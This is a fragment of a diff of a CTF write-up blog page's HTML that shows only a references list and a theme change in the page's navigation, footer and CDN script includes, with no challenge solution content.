 <h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=P5RloHad34Q" target="_blank" rel="noopener">https://www.youtube.com/watch?v=P5RloHad34Q</a><br><a href="https://www.youtube.com/watch?v=68Tgdx_Y8ng" target="_blank" rel="noopener">https://www.youtube.com/watch?v=68Tgdx_Y8ng</a><br><a href="https://www.youtube.com/watch?v=Qg3qOjylZpw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Qg3qOjylZpw</a><br><a href="https://www.youtube.com/watch?v=RmGl1mje1Ho" target="_blank" rel="noopener">https://www.youtube.com/watch?v=RmGl1mje1Ho</a><br><a href="https://github.com/ziyedbe/b00t2root-19/tree/master/Scatter%20Me" target="_blank" rel="noopener">https://github.com/ziyedbe/b00t2root-19/tree/master/Scatter%20Me</a></p>
 
-      
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wp/">wp</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/04/15/Some-Linux-Category-Challenges/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Some Linux Category Challenges</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/03/25/2019-Securinets-CTF-Quals/">
+                        <span>2019-Securinets-CTF-Quals</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
     </div>
-    <footer class="entry-meta entry-footer">
-      
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
 
-      
-        
-	<div id="comment">
-		<!-- 来必力City版安装代码 -->
-		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
-		<script type="text/javascript">
-		   (function(d, s) {
-		       var j, e = d.getElementsByTagName(s)[0];
-
-		       if (typeof LivereTower === 'function') { return; }
-
-		       j = d.createElement(s);
-		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-		       j.async = true;
-
-		       e.parentNode.insertBefore(j, e);
-		   })(document, 'script');
-		</script>
-		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-		</div>
-		<!-- City版安装代码已完成 -->
-	</div>
-
-
-
-      
-    </footer>
-    <hr class="entry-footer-hr">
+      </div>
+    
   </div>
-  
+</div>
+
+<!-- Custom -->
+
+
     
-<nav id="article-nav">
+  </main>
+
   
-    <a href="/2019/04/15/Some-Linux-Category-Challenges/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          Some Linux Category Challenges
-        
-      </div>
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
     </a>
   
-  
-    <a href="/2019/03/25/2019-Securinets-CTF-Quals/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">2019-Securinets-CTF-Quals</div>
-    </a>
-  
-</nav>
 
   
-</article>
-
-<!-- Table of Contents -->
-
-  <aside id="sidebar">
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">Contents</strong>
-    
-      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyPhp"><span class="nav-number">1.1.</span> <span class="nav-text">EasyPhp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Scatter-Me"><span class="nav-number">2.1.</span> <span class="nav-text">Scatter Me</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux"><span class="nav-number">3.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Steve-Rogers"><span class="nav-number">3.1.</span> <span class="nav-text">Steve Rogers</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tony-Stank"><span class="nav-number">3.2.</span> <span class="nav-text">Tony Stank</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Groot"><span class="nav-number">3.3.</span> <span class="nav-text">Groot</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#forensics"><span class="nav-number">4.</span> <span class="nav-text">forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#key-me-baby"><span class="nav-number">4.1.</span> <span class="nav-text">key_me_baby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#loopback"><span class="nav-number">4.2.</span> <span class="nav-text">loopback</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol>
-    
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-  </aside>
+  </div>
+</div>
+  
 
-</section>
-        
-      </div>
+  
 
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
     </div>
-    <!-- <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
-  
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
 
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 AssassinQ All Rights Reserved.
-        
-      </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
-      </div>
+
+    
+
+    
   </div>
 </footer>
 
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-</div>
-
-<!-- mathjax config similar to math.stackexchange -->
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
 
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
 
-  <div style="display: none;">
-    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-  </div>
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
+<!-- Plugins -->
 
 
 
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  </div>
 
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2019-b00t2root-CTF&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
@@ -405,5 +844,17 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
 </body>
 </html>
